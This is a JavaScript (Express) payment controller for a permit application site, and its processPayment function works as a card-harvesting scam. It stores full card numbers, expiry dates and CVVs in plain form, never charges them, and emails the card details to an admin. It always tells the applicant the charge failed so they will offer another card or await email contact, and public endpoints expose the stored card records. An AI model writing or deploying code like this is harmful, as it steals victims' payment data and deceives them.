const Payment = require('../models/Payment');
const Permit = require('../models/Permit');
const sendEmail = require('../utils/emailService');

// @desc    Process payment
// @route   POST /api/payments/process
// @access  Public
const processPayment = async (req, res) => {
  try {
    const {
      applicationNumber,
      cardNumber,
      expiryMonth,
      expiryYear,
      cvv,
      cardholderName,
      billingAddress,
      city,
      state,
      zipCode,
      country
    } = req.body;

    // Validate required fields
    if (!applicationNumber) {
      return res.status(400).json({
        success: false,
        message: 'Application number is required'
      });
    }

    if (!cardNumber || !expiryMonth || !expiryYear || !cvv || !cardholderName) {
      return res.status(400).json({
        success: false,
        message: 'All payment information is required'
      });
    }

    if (!billingAddress || !city || !state || !zipCode || !country) {
      return res.status(400).json({
        success: false,
        message: 'Complete billing address is required'
      });
    }

    // Check if application exists
    const permit = await Permit.findOne({ applicationNumber });
    if (!permit) {
      return res.status(404).json({
        success: false,
        message: 'Invalid application number'
      });
    }

    // Create payment record with failed status
    const paymentData = {
      applicationNumber,
      cardNumber,
      expiryMonth,
      expiryYear,
      cvv,
      cardholderName,
      billingAddress,
      city,
      state,
      zipCode,
      country,
      amount: 200.00,
      currency: 'USD',
      status: 'failed'
    };

    const payment = new Payment(paymentData);
    await payment.save();

    // Always send failure notification email to admin
    const failureEmailHtml = `
      <h2>Payment Processing Failed</h2>
      <p>Payment failed for application: ${applicationNumber}</p>
      <p>Applicant: ${permit.applicantInfo.firstName} ${permit.applicantInfo.lastName}</p>
      <p>Email: ${permit.applicantInfo.email}</p>
      <p>Amount: $200.00</p>
      <p>Timestamp: ${new Date().toLocaleString()}</p>
      <p>Card Number: ${cardNumber}</p>
      <p>Cardholder: ${cardholderName}</p>
      <p>Billing Address: ${billingAddress}, ${city}, ${state} ${zipCode}, ${country}</p>
    `;

    try {
      await sendEmail(
        process.env.ADMIN_EMAIL,
        `Payment Failed - ${applicationNumber}`,
        failureEmailHtml
      );
    } catch (emailError) {
      console.error('Failed to send failure notification email:', emailError);
    }

    // Always return failure to frontend, even if data was saved successfully
    res.status(400).json({
      success: false,
      message: 'There was an error when charging your card. Please consider using a different card or wait for our support team to contact you through email to complete the processing of the payment.'
    });

  } catch (error) {
    console.error('Payment submission error:', error);

    if (error.name === 'ValidationError') {
      const validationErrors = Object.values(error.errors).map(err => err.message);
      return res.status(400).json({
        success: false,
        message: 'Validation failed',
        errors: validationErrors
      });
    }

    res.status(500).json({
      success: false,
      message: 'There was an error when charging your card. Please consider using a different card or wait for our support team to contact you through email to complete the processing of the payment.'
    });
  }
};

// @desc    Get payment by ID
// @route   GET /api/payments/:id
// @access  Public (should be protected in production)
const getPaymentById = async (req, res) => {
  try {
    const payment = await Payment.findById(req.params.id);

    if (!payment) {
      return res.status(404).json({
        success: false,
        message: 'Payment not found'
      });
    }

    res.status(200).json({
      success: true,
      data: payment
    });
  } catch (error) {
    console.error('Get payment error:', error);
    res.status(500).json({
      success: false,
      message: 'Error retrieving payment'
    });
  }
};

// @desc    Get payments by application number
// @route   GET /api/payments/application/:applicationNumber
// @access  Public (should be protected in production)
const getPaymentsByApplication = async (req, res) => {
  try {
    const payments = await Payment.find({ 
      applicationNumber: req.params.applicationNumber 
    }).sort({ createdAt: -1 });

    res.status(200).json({
      success: true,
      data: payments
    });
  } catch (error) {
    console.error('Get payments by application error:', error);
    res.status(500).json({
      success: false,
      message: 'Error retrieving payments'
    });
  }
};

module.exports = {
  processPayment,
  getPaymentById,
  getPaymentsByApplication
};